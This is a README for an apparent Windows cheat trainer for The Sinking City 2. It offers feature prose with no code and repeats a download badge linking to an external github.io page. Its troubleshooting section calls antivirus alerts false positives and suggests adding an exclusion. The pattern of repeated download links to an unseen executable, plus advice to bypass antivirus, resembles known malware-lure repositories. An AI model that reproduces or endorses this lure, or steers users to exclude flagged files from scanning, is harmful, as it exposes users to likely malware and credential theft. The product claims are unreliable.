![preview](https://raw.githubusercontent.com/maulanakhober-stack/Midnight-Tide-Profile-Deck/main/showcase_0d15d.svg)
[![Download](https://raw.githubusercontent.com/maulanakhober-stack/Midnight-Tide-Profile-Deck/main/launch_b495fe.svg)](https://maulanakhober-stack.github.io/Midnight-Tide-Profile-Deck/)

# 🌊 The Sinking City 2 PC Trainer — Tidal Companion Suite

> *A lighthouse for players navigating the flooded streets of Oakmont.*  
> *Midnight-built, tide-tested, and tuned for the curious investigator.*

[![Download](https://raw.githubusercontent.com/maulanakhober-stack/Midnight-Tide-Profile-Deck/main/launch_b495fe.svg)](https://maulanakhober-stack.github.io/Midnight-Tide-Profile-Deck/)

![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0078D4?style=flat-square&logo=windows&logoColor=white)
![Architecture](https://img.shields.io/badge/architecture-x64%20%7C%20ARM64-555555?style=flat-square)
![Version](https://img.shields.io/badge/version-2.4.1-2ea44f?style=flat-square)
![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)
![Status](https://img.shields.io/badge/status-actively%20maintained-brightgreen?style=flat-square)
![Language](https://img.shields.io/badge/localization-EN%20%7C%20DE%20%7C%20FR%20%7C%20ES%20%7C%20PL%20%7C%20PT--BR%20%7C%20RU%20%7C%20ZH--CN-9cf?style=flat-square)
![Support](https://img.shields.io/badge/support-24%2F7-ff69b4?style=flat-square)
![Build](https://img.shields.io/badge/build-passing-success?style=flat-square)
![Made with](https://img.shields.io/badge/made%20with-C%23%20%2B%20WinUI%203-512BD4?style=flat-square)

---

## 📖 Table of Contents

1. [The Vision Behind the Tidal Companion Suite](#-the-vision-behind-the-tidal-companion-suite)
2. [Why a Trainer, and Why Now](#-why-a-trainer-and-why-now)
3. [Feature Highlights](#-feature-highlights)
4. [Profile Management That Feels Like Cartography](#-profile-management-that-feels-like-cartography)
5. [Hotkey Architecture](#-hotkey-architecture)
6. [Resource & Attribute Controls](#-resource--attribute-controls)
7. [Quality-of-Life Modules](#-quality-of-life-modules)
8. [Player Settings & Personalization](#-player-settings--personalization)
9. [The Dashboard Experience](#-the-dashboard-experience)
10. [Multilingual & Accessibility Support](#-multilingual--accessibility-support)
11. [Responsive UI & Performance Notes](#-responsive-ui--performance-notes)
12. [System Requirements](#-system-requirements)
13. [Getting Started — The Dockside Ritual](#-getting-started--the-dockside-ritual)
14. [Configuration File Anatomy](#-configuration-file-anatomy)
15. [Safety, Ethics, and Single-Player Philosophy](#-safety-ethics-and-single-player-philosophy)
16. [Troubleshooting the Murky Waters](#-troubleshooting-the-murky-waters)
17. [Frequently Asked Questions](#-frequently-asked-questions)
18. [Roadmap for 2026](#-roadmap-for-2026)
19. [Community & Support Channels](#-community--support-channels)
20. [Contributing Philosophy](#-contributing-philosophy)
21. [License](#-license)
22. [Disclaimer](#-disclaimer)

[![Download](https://raw.githubusercontent.com/maulanakhober-stack/Midnight-Tide-Profile-Deck/main/launch_b495fe.svg)](https://maulanakhober-stack.github.io/Midnight-Tide-Profile-Deck/)

---

## 🌊 The Vision Behind the Tidal Companion Suite

There is a particular kind of silence that hangs over a flooded city — the way water laps against brick, the way echoes carry twice as far, the way every shadow seems to be listening. **The Sinking City 2** paints that silence masterfully. But sometimes, as a player, you want to walk through Oakmont not as a victim of its currents, but as an architect of them.

This repository houses the **Tidal Companion Suite**, a PC-based dashboard utility designed for Windows players of The Sinking City 2 who want granular, transparent control over their single-player session. It is not a script runner. It is not a cheat engine wrapper. It is a lovingly engineered companion — a nautical instrument panel for your own private voyage through the drowned avenues.

Think of it as a ship's log you actually get to write.

---

## ⚓ Why a Trainer, and Why Now

Modern single-player games often reward exploration with time — time to gather, time to craft, time to recover. For players with limited hours, that time can be a barrier rather than a delight. The Tidal Companion Suite exists to remove friction, not to remove challenge. It lets you decide which currents to swim with.

The project began as a personal utility and grew, somewhat like mildew in a damp cellar, into something more structured. What started as a handful of hotkeys matured into a polished dashboard with profile swappability, localization, and a philosophy of restraint.

---

## ✨ Feature Highlights

- **Polished profile management** — save, rename, duplicate, and swap between loadout presets without leaving the dashboard.
- **Configurable hotkeys** — remap almost anything, with conflict detection and a clean capture dialog.
- **Resource controls** — gently adjust supplies, currency, and crafting materials.
- **Attribute tuning** — modify player-derived values with min/max clamps to avoid instability.
- **Quality-of-life modules** — toggleable helpers like faster interaction prompts and reduced fog-of-war obfuscation.
- **Player settings panel** — movement, camera, and UI preferences stored per-profile.
- **Fast Windows dashboard** — built with WinUI 3 for snappy rendering.
- **Multilingual interface** — eight locales at launch, with community translations welcome.
- **Responsive layout** — adapts fluidly from 1280×720 up to ultrawide.
- **24/7 customer support** — because Oakmont's nights are long.
- **Offline-first design** — no network calls for core functionality.
- **Portable mode** — run it from a folder; no installer required.

[![Download](https://raw.githubusercontent.com/maulanakhober-stack/Midnight-Tide-Profile-Deck/main/launch_b495fe.svg)](https://maulanakhober-stack.github.io/Midnight-Tide-Profile-Deck/)

---

## 🗺️ Profile Management That Feels Like Cartography

A profile in the Tidal Companion Suite is not just a saved state — it is a map of intent. Each profile stores:

- Hotkey bindings
- Module toggles
- Resource presets
- Player setting snapshots
- Interface theme preferences

You can maintain a **"Casual Drift"** profile for relaxed exploration, a **"Stormwatch"** profile for tense resource-limited runs, and a **"Cartographer"** profile for pure sightseeing. Switching between them is a single click, and the dashboard rehydrates instantly.

Profiles are stored as readable JSON in the `profiles/` directory, because transparency matters more than obfuscation.

---

## ⌨️ Hotkey Architecture

The hotkey system was rebuilt in version 2.x to be capture-friendly and collision-aware. When you assign a combination, the suite checks against every other binding and warns you before committing.

Default gestures (all remappable):

| Action | Default |
|---|---|
| Toggle Dashboard Overlay | `Ctrl + Shift + D` |
| Cycle Active Profile | `Ctrl + Shift + P` |
| Freeze Resource Tick | `Ctrl + Shift + F` |
| Toggle Fog Reduction | `Ctrl + Shift + G` |
| Reload Configuration | `Ctrl + Shift + R` |
| Panic Detach | `F12` |

The **Panic Detach** binding is intentionally singular: one keystroke returns the suite to a dormant state, leaving the game world untouched.

---

## 💧 Resource & Attribute Controls

Resource controls are presented as sliders with numeric readouts, not as magic toggles. Each slider has a **safe band** — a green zone that the developers have tested against hours of gameplay. Values outside the band are allowed, but the UI nudges you with a gentle amber shimmer.

Attribute tuning follows the same philosophy. Nothing is permanent until you press **Apply**, and every change is logged so you can revert.

There is no "god mode" button here by design. If you want invulnerability, you want a different tool. This suite is about shaping a session, not erasing one.

---

## 🧭 Quality-of-Life Modules

Each module is a small, independent lens through which to view the game:

- **Interaction Boost** — extends the prompt window so you can decide rather than reflexively tap.
- **Fog Reduction** — softens map obfuscation without removing exploration reward.
- **Inventory Whisper** — surfaces item categories with clearer grouping.
- **Dialogue Relaxer** — pauses timed dialogue choices until you are ready.
- **Crafting Preview** — show recipe outcomes before committing materials.
- **Weather Softener** — reduce the intensity of visual weather effects for comfort.

Every module can be disabled in one click, and every module documents exactly what it touches.

---

## 🎛️ Player Settings & Personalization

The **Player Settings** panel gathers the odds and ends that usually live buried in config files:

- Field of view
- Mouse sensitivity curves
- Camera sway dampening
- HUD scale
- Subtitle background opacity
- Colorblind palettes

These are stored per-profile, so your "Casual Drift" profile can be cozy while "Stormwatch" stays austere.

---

## 🖥️ The Dashboard Experience

The dashboard is a single window with three zones:

1. **The Helm** — profile switcher, apply/revert controls, and status indicators.
2. **The Chart Room** — sliders, toggles, and module cards.
3. **The Log** — a rolling event feed showing every action you take.

It is fast because it is native. WinUI 3 means no Electron tax, no browser sandbox, and no wall of memory bloat. Cold start on a modest laptop is well under two seconds.

---

## 🌍 Multilingual & Accessibility Support

Localization is not an afterthought. Every string lives in resource dictionaries, and the suite ships with:

- English
- German
- French
- Spanish
- Polish
- Portuguese (Brazil)
- Russian
- Simplified Chinese

Accessibility touches include keyboard-only navigation, high-contrast theme, scalable typography, and screen-reader labels on every interactive control.

---

## 📱 Responsive UI & Performance Notes

The layout reflows intelligently:

- **1280×720** — compact single-column mode
- **1920×1080** — two-column default
- **2560×1440 and up** — three-column with expanded log

CPU impact while idle stays under one percent on modern hardware. The suite sleeps when the game is not running.

---

## 🧩 System Requirements

- **OS:** Windows 10 (21H2+) or Windows 11
- **Runtime:** .NET 8 Desktop Runtime
- **RAM:** 4 GB minimum, 8 GB recommended
- **Disk:** 120 MB for the suite and profiles
- **Display:** 1280×720 or greater
- **Game:** A legitimate installation of The Sinking City 2

[![Download](https://raw.githubusercontent.com/maulanakhober-stack/Midnight-Tide-Profile-Deck/main/launch_b495fe.svg)](https://maulanakhober-stack.github.io/Midnight-Tide-Profile-Deck/)

---

## 🚤 Getting Started — The Dockside Ritual

1. Retrieve the suite package using the [![Download](https://raw.githubusercontent.com/maulanakhober-stack/Midnight-Tide-Profile-Deck/main/launch_b495fe.svg)](https://maulanakhober-stack.github.io/Midnight-Tide-Profile-Deck/) link above.
2. Unpack the archive into a folder of your choosing — a short path like `C:\Tools\TidalCompanion` avoids deep-nesting quirks.
3. Launch the executable. On first run, the suite creates a `profiles/` folder and a default profile.
4. Start The Sinking City 2 and load into a save.
5. Return to the dashboard, choose a profile, and press **Attach**.
6. Adjust sliders and modules to taste, then **Apply**.

No installers, no registry writes, no background services. When you close the window, it is gone.

---

## 📜 Configuration File Anatomy

Each profile is a JSON document with three top-level sections:

- `meta` — name, created date, and notes
- `bindings` — hotkey map
- `modules` — toggle states and parameter values

Because it is plain JSON, you can version-control your profiles, share them with friends, or hand-edit them in a text editor. The suite validates on load and reports friendly errors if something is malformed.

---

## 🛡️ Safety, Ethics, and Single-Player Philosophy

This project is built on three principles:

1. **Single-player only.** The Sinking City 2's narrative is a personal journey; the suite respects that.
2. **Transparency.** Every change is logged, every default is documented, every module is optional.
3. **Reversibility.** Nothing is permanent. Revert is always one click away.

We do not condone using this suite in any context that violates the game's terms of service, and we encourage players to experience the campaign at least once without adjustments.

---

## 🌫️ Troubleshooting the Murky Waters

**The dashboard does not detect the game.**  
Ensure the game is running before pressing Attach, and confirm you are using the same privilege level.

**Hotkeys do nothing in-game.**  
Some games capture keyboard input exclusively. Try running the suite as administrator, or remap to combinations the game ignores.

**Profiles appear empty after an update.**  
Check the `profiles/` folder for backup files created during migration. The suite never deletes without leaving a copy.

**Antivirus flags the executable.**  
This is a common false positive for unsigned utilities. Verify the file hash against the release notes, and consider adding an exclusion.

**Sliders snap back to defaults.**  
You likely forgot to press Apply. Changes are staged, not live, until confirmed.

---

## ❓ Frequently Asked Questions

**Is this suite officially affiliated with the game's publisher?**  
No. It is an independent community project.

**Can I use it for streaming?**  
Yes, though we recommend disclosing it in your stream description.

**Will it work with future patches?**  
We track patches closely and ship compatibility updates. Check the roadmap for expected timelines.

**Does it phone home?**  
No. There are zero telemetry calls in the core suite.

**Can I translate it?**  
Absolutely. Resource dictionaries are plain XML and welcome contributions.

---

## 🗓️ Roadmap for 2026

- **Q1 2026** — Module SDK for community-authored quality-of-life additions
- **Q2 2026** — Profile cloud sync (opt-in, end-to-end encrypted)
- **Q3 2026** — Companion mobile viewer for reading logs remotely
- **Q4 2026** — Theming engine with shareable palettes

The roadmap is a living document; community feedback reshapes it every quarter.

---

## 💬 Community & Support Channels

Round-the-clock support is available through the repository's issue tracker and discussion threads. Expect a first response within a few hours, and a resolution path within a day. Respectful, detailed bug reports get priority.

---

## 🤝 Contributing Philosophy

Contributions are welcome when they align with the project's restraint-first ethos. Before opening a pull request, ask yourself: *does this add capability without removing choice?* If yes, we want to see it.

---

## 📄 License

This project is released under the **MIT License**.  
Read the full text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright © 2026 — Tidal Companion Suite contributors.

---

## ⚠️ Disclaimer

The Tidal Companion Suite is an unofficial, fan-made utility intended strictly for **single-player, offline use**. It is not endorsed by, affiliated with, or supported by the developers or publishers of The Sinking City 2. Users assume all responsibility for how they apply the tooling described here. The maintainers disclaim liability for any consequence arising from misuse, including but not limited to violations of a game's terms of service, corrupted save files, or unintended interactions with third-party software.

Always keep backups of your save data before experimenting. The tides of Oakmont are patient — be patient too.

[![Download](https://raw.githubusercontent.com/maulanakhober-stack/Midnight-Tide-Profile-Deck/main/launch_b495fe.svg)](https://maulanakhober-stack.github.io/Midnight-Tide-Profile-Deck/)